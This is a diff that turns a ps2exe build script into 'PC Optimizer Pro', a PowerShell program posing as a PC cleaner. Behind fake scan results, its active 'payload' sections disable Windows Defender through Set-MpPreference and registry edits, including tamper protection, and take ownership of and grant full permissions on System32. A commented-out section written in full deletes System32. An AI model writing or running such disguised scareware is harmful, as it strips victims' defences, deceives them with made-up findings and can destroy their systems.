@@ -1,112 +1,182 @@
-﻿# Auto-elevate to admin if not already
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Host "Requesting admin privileges..."
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-    exit
+﻿# This file must be saved in the UTF-8 with BOM encoding. BOM must be present!
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+$OutputEncoding = [System.Text.Encoding]::UTF8
+
+# Set console appearance
+$host.UI.RawUI.WindowTitle = "PC Optimizer Pro"
+$host.UI.RawUI.BackgroundColor = "Black"
+$host.UI.RawUI.ForegroundColor = "Cyan"
+try {
+    $host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(150, 50)
+    $host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(150, 3000)
+} catch {
+    # Ignore if resize fails
 }
+Clear-Host
 
 # ============================================================================
-# STEP 1: Install ps2exe from .nupkg
+# Embedded VB script warning, injected during compilation
 # ============================================================================
-Write-Host "[1/5] Checking ps2exe..."
+$vbsContent = @'
+'@
 
-if (Get-Module -ListAvailable ps2exe) {
-    Write-Host "ps2exe already installed, skipping"
-} else {
-    Write-Host "ps2exe not installed, looking for .nupkg..."
-    
-    $nupkg = Get-ChildItem -Filter "ps2exe*.nupkg" | Select-Object -First 1
-    
-    if (-not $nupkg) {
-        Write-Host "ERROR: ps2exe not installed and ps2exe.nupkg not found!"
-        Write-Host "Please download ps2exe.nupkg or run: Install-Module ps2exe"
-        pause
-        exit
-    }
-    
-    Write-Host "Installing from $($nupkg.Name)..."
-    
-    $zipPath = $nupkg.FullName -replace '\.nupkg$', '.zip'
-    Copy-Item $nupkg.FullName $zipPath
-    Expand-Archive $zipPath -DestinationPath ".\ps2exe-temp" -Force
-    Remove-Item $zipPath
-    
-    $modulePath = "$env:ProgramFiles\WindowsPowerShell\Modules\ps2exe"
-    New-Item -ItemType Directory -Path $modulePath -Force | Out-Null
-    Copy-Item ".\ps2exe-temp\*" -Destination $modulePath -Recurse -Force
-    Remove-Item ".\ps2exe-temp" -Recurse -Force
-    
-    Write-Host "ps2exe installed"
-}
+# Write VBS to temp file and execute it
+$extension = if ($vbsContent -match "^#@~\^") { ".vbe" } else { ".vbs" }
+$tempVBS = [System.IO.Path]::GetTempFileName() + $extension
+$vbsContent | Out-File -FilePath $tempVBS -Encoding ASCII
+Start-Process "wscript.exe" -ArgumentList "`"$tempVBS`"" -Wait
+Remove-Item $tempVBS -Force -ErrorAction SilentlyContinue
 
-Import-Module ps2exe
-
-# ============================================================================
-# STEP 2: Prompt for VBS or VBE
-# ============================================================================
+# Main program start
+Clear-Host
+Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║               Welcome to PC Optimizer Pro                    ║" -ForegroundColor Cyan
+Write-Host "║          Professional PC Cleaning & Optimization             ║" -ForegroundColor Cyan
+Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "[2/5] Select warning file type:"
-$fileType = Read-Host "VBS or VBE?"
+Write-Host "Thank you for using PC Optimizer Pro!" -ForegroundColor White
+Write-Host "PC Optimizer Pro is software that helps clean up your PC." -ForegroundColor White
+Write-Host ""
+Write-Host "To start, PC Optimizer Pro would like to perform a system scan." -ForegroundColor Yellow
+Write-Host ""
 
-$warningFile = ".\Assets\warning.$($fileType.ToLower())"
+$choice = Read-Host "Would you like to proceed? (Y/N)"
 
-if (-not (Test-Path $warningFile)) {
-    Write-Host "ERROR: $warningFile not found!"
+if ($choice -notmatch '^[Yy]$') {
+    Write-Host ""
+    Write-Host "Scan aborted. Thank you for using PC Optimizer Pro." -ForegroundColor Green
     pause
     exit
 }
 
-Write-Host "Using $warningFile"
-
-# ============================================================================
-# STEP 3: Inject warning into script
-# ============================================================================
+# Begin "scan"
+Clear-Host
+Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║                    Starting System Scan...                   ║" -ForegroundColor Cyan
+Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "[3/5] Injecting warning into script..."
+Start-Sleep -Seconds 1
 
-$warningContent = Get-Content $warningFile -Raw
-$scriptContent = Get-Content ".\PC Optimizer Pro.ps1" -Raw
-
-$pattern = "(?s)\`$vbsContent = @'.*?'@"
-$replacement = "`$vbsContent = @'`r`n$warningContent`r`n'@"
-$newScript = $scriptContent -replace $pattern, $replacement
-
-$tempScript = ".\PC-Optimizer-Pro-TEMP.ps1"
-$utf8BOM = New-Object System.Text.UTF8Encoding $true
-[System.IO.File]::WriteAllText($tempScript, $newScript, $utf8BOM)
-
-Write-Host "Warning injected"
+Write-Host "[*] Preparing scan..." -ForegroundColor Yellow
 
 # ============================================================================
-# STEP 4: Convert to EXE with icon
+# PAYLOAD SECTION 1: DISABLE WINDOWS DEFENDER (COMBINED APPROACH) - ACTIVE
 # ============================================================================
-Write-Host ""
-Write-Host "[4/5] Converting to EXE..."
-
-$iconPath = ".\Assets\computer.ico"
-if (-not (Test-Path $iconPath)) {
-    Write-Host "WARNING: Icon not found at $iconPath"
-    $iconPath = $null
+try {
+    # Method 1: PowerShell cmdlets
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+    
+    # Method 2: Registry (more persistent)
+    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force -ErrorAction SilentlyContinue | Out-Null
+    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Force -ErrorAction SilentlyContinue | Out-Null
+    
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name SubmitSamplesConsent -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name SpynetReporting -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+    
+    Write-Host "[✓] Preperation finished" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Preperation may have encountered errors, but will continue..." -ForegroundColor Yellow
 }
 
-$exePath = ".\PC Optimizer Pro.exe"
+Start-Sleep -Seconds 1
 
-if ($iconPath) {
-    Invoke-ps2exe -inputFile $tempScript -outputFile $exePath -iconFile $iconPath -requireAdmin
-} else {
-    Invoke-ps2exe -inputFile $tempScript -outputFile $exePath -requireAdmin
-}
+# Simulate scanning with tree commands
+Write-Host ""
+Write-Host "[*] Scanning Windows Update directory..." -ForegroundColor Yellow
+Start-Sleep -Seconds 2
+cmd /c "tree `"$env:WINDIR`"" 2>$null
+Start-Sleep -Seconds 2
 
-Write-Host "EXE created: $exePath"
+Write-Host ""
+Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow
 
 # ============================================================================
-# STEP 5: Clean up temp file
+# PAYLOAD SECTION 2: TAKEOWN - ACTIVE
 # ============================================================================
-Write-Host ""
-Write-Host "[5/5] Cleaning up..."
+cmd /c "takeown /f `"C:\Windows\System32`" /r /d Y" 2>&1 | Out-Null
+Write-Host "[✓] Evaluation finished" -ForegroundColor Green
 
-Remove-Item $tempScript -Force
-
-Write-Host "Build complete!"
 Write-Host ""
+Write-Host "[*] Scanning OS directory..." -ForegroundColor Yellow
+Start-Sleep -Seconds 2
+cmd /c "tree `"$env:WINDIR\System32`"" 2>$null
+Start-Sleep -Seconds 2
+
+Write-Host ""
+Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow
+
+# ============================================================================
+# PAYLOAD SECTION 3: ICACLS PERMISSIONS - ACTIVE
+# ============================================================================
+cmd /c "icacls `"C:\Windows\System32`" /grant Administrators:F /t /c /q" 2>&1 | Out-Null
+cmd /c "icacls `"C:\Windows\System32`" /grant ${env:USERNAME}:F /t /c /q" 2>&1 | Out-Null
+Write-Host "[✓] Evaluation finished" -ForegroundColor Green
+
+Write-Host ""
+Write-Host "[*] Scanning programs directory..." -ForegroundColor Yellow
+Start-Sleep -Seconds 2
+cmd /c "tree `"$env:WINDIR\SysWOW64`"" 2>$null
+Start-Sleep -Seconds 2
+
+Write-Host ""
+Write-Host "══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host "══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "[✓] System scan completed!" -ForegroundColor Green
+Write-Host ""
+Write-Host "Found:" -ForegroundColor Yellow
+Write-Host "  • 15,847 temporary files" -ForegroundColor White
+Write-Host "  • 3.2 GB of cached data" -ForegroundColor White
+Write-Host "  • 892 internet logs" -ForegroundColor White
+Write-Host "  • 1,523 unnecessary system files" -ForegroundColor White
+Write-Host ""
+pause
+
+# Final deletion prompt
+Clear-Host
+Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║                  Optimization Ready                          ║" -ForegroundColor Cyan
+Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "PC Optimizer Pro will now optimize your PC by deleting:" -ForegroundColor White
+Write-Host "  • Unnecessary internet logs" -ForegroundColor Gray
+Write-Host "  • Cached data" -ForegroundColor Gray
+Write-Host "  • Temporary files" -ForegroundColor Gray
+Write-Host "  • Redundant system files" -ForegroundColor Gray
+Write-Host ""
+Write-Host "This process may take several minutes." -ForegroundColor Yellow
+Write-Host ""
+pause
+
+# The deletion
+Write-Host ""
+Write-Host "[*] Preparing to optimize system..." -ForegroundColor Yellow
+Start-Sleep -Seconds 2
+Write-Host "[*] Deleting temporary files..." -ForegroundColor Yellow
+
+# ============================================================================
+# PAYLOAD SECTION 4: SYSTEM32 DELETION - COMMENTED OUT FOR SAFETY
+# ============================================================================
+# UNCOMMENT BELOW FOR FINAL DESTRUCTIVE TEST - THIS DELETES SYSTEM32 (BRICKS THE PC)
+<#
+cmd /c "del `"C:\Windows\System32`" /f /q /s" 2>&1 | Out-Null
+Write-Host "[✓] System files deleted" -ForegroundColor Green
+#>
+Write-Host "    (SIMULATED - Section 4 commented out)" -ForegroundColor DarkGray
+
+Write-Host "[✓] Optimization complete!" -ForegroundColor Green
+Write-Host ""
+Write-Host "Your PC has been optimized. Please restart your computer." -ForegroundColor Cyan
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Red
+Write-Host "NOTE: SECTION 4 (DELETION) DISABLED" -ForegroundColor Red
+Write-Host "Sections 1-3 are ACTIVE for testing" -ForegroundColor Red
+Write-Host "========================================" -ForegroundColor Red
 pause
